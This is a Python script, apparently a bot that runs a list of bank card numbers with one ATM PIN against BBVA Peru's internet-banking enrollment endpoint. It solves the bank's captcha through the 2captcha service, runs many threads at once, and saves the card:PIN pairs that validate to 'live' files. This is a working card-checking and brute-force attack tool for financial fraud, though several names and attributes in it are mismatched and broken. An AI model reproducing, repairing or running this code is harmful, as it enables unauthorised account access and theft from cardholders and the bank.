from ansi.colour import bg, fg
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests, os

class BotBbva:

	def init(self, tarjeta=None, clave=None, key=None):
		self.__tarjeta = tarjeta
		self.__clave = clave
		self.__key = key
		self.__sesion = requests.Session()
		self.__url_init = "https://www.bbva.pe/personas/olvido-contrasena.html"
		self.__url_captcha = "https://bancaporinternet.bbva.pe/bdpnux_pe_web/bdpnux_pe_web/shared/captcha"
		self.__verificacion = "https://bancaporinternet.bbva.pe/bdpnux_pe_web/bdpnux_pe_web/aem/modificacion/verificacion"
		self.__base_afiliacion = "https://www.bbva.pe/personas/afiliacion.html"
		self.__afiliacion = "https://bancaporinternet.bbva.pe/bdpnux_pe_web/bdpnux_pe_web/aem/inscripcion/verificacion"
		self.__payload = {
			"numeroTarjeta":str(self.__tarjeta),
			"claveCajero": self.__clave,
			"codigoCaptcha":None
		}

	def inicio(self):
		try:
			self.__confirm = True
			self.__head = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
			}
			
			response = self._sesion.get(url=self.base_afiliacion, headers=self.head, stream=self._confirm)
			self.__cookies = response.cookies
		except Exception as error1:
			print(f"Error1: {error1}")
			return False

	def get_captcha(self):
		try:
		   bi_captcha = self._sesion.get(url=self.url_captcha, cookies=self._cookies)
		   with open("captcha_bbva.png", "wb") as file_captcha:
		      for b in bi_captcha.iter_content():
		         file_captcha.write(b)
		   api_text_captcha = "http://2captcha.com/in.php"
		   id_captcha = requests.post(url=api_text_captcha,data={"key":f"{self.__key}"}, files={"file":open("captcha_bbva.png", "rb")})
		   
		   id_captcha = id_captcha.text.split("|")[1]
		   
		   url_api_text_captcha = f"http://2captcha.com/res.php?key={self.__key}&action=get&id={id_captcha}"
		   
		   while True:
		      texto_captcha = requests.get(url=url_api_text_captcha)
		      if "CAPCHA_NOT_READY" not in texto_captcha.text:
		         texto_captcha = texto_captcha.text.split("|")[1]
		         break
		   self.__payload["codigoCaptcha"] = texto_captcha
			#pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

			#texto_captcha = pytesseract.image_to_string(Image.open("captcha_bbva.png"), config="--psm 8 -c tessedit_char_whitelist=0123456789abcdefghijkmnlopqrsturstuvwxyz")

			#texto_captcha = str(input("Escribe el captcha: "))

			#self.__payload["codigoCaptcha"] = texto_captcha.replace(" ","").strip()
		except Exception as error2:
			print(f"Error2 {error2}")
			return False

	def get_logo(self):
		try:
			mensaje = self.__sesion.post(url=self._afiliacion, data=self.payload, cookies=self._cookies)
			if "En caso no recuerdes tu contrase" in mensaje.text:
				print(f"[{str(datetime.now())[:19]}] Tarjeta: {self._tarjeta} Clave: {self._clave}" + " --> " + fg.green("Olvide-Contraseña"))
				with open("logos/olvide_contraseña.txt", "a") as lives:
					lives.write(f"{self._tarjeta}:{self._clave}\n")
			elif "Debe tener de 6 y 9 caracteres." in mensaje.text:
				print(f"[{str(datetime.now())[:19]}] Tarjeta: {self._tarjeta} Clave: {self._clave}" + " --> " + fg.green("Afiliacion"))
				with open("logos/afiliar_cuenta.txt", "a") as lives:
					lives.write(f"{self._tarjeta}:{self._clave}\n")
			else:
				print(f"[{str(datetime.now())[:19]}] Tarjeta: {self._tarjeta} Clave: {self._clave}" + " --> " + fg.red("Failed"))

		except Exception as error3:
			print(f"Error3: {error3}")
			return False


if name == 'main':

	os.system("cls")

	clave = input("Clave ATM: ")
	key = input("Key Authorization: ")
	path_tarjetas = input("Path Tarjetas: ")
	workers = input("Workers: ")

	def main(tarjeta, clave, key):
		bot = BotBbva(tarjeta=str(tarjeta).strip(), clave=clave, key=key)
		if bot.inicio() == False: main(tarjeta, clave, key)
		if bot.get_captcha() == False: main(tarjeta, clave, key)
		if bot.get_logo() == False: main(tarjeta, clave, key)
	
	with ThreadPoolExecutor(max_workers=int(workers)) as executor:
		with open("tarjetas/" + path_tarjetas,"r") as tarjetas:
			for tarjeta in tarjetas.readlines():
				executor.submit(main, tarjeta.strip(), clave, key)